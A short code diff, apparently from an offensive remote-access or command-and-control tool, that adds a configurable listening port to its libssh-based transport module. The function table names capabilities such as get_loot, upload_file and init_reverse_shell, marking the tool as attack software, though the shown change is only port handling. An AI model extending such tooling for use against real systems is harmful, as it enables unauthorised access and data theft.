@@ -15,7 +15,7 @@ transport_t transport_api = {
     send_ok, send_err, listen, read, write,
     get_loot, upload_file, init_reverse_shell, 
     determine_handler, init, end, nullptr, 
-    get_data, get_name, get_id
+    get_data, get_name, get_id, set_port
 };
 
 int init(pClientDat dat)
@@ -465,6 +465,7 @@ int listen(){
 	
     ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
     ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
+    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT, &port);
 
     if(ssh_bind_listen(sshbind)<0){
         printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
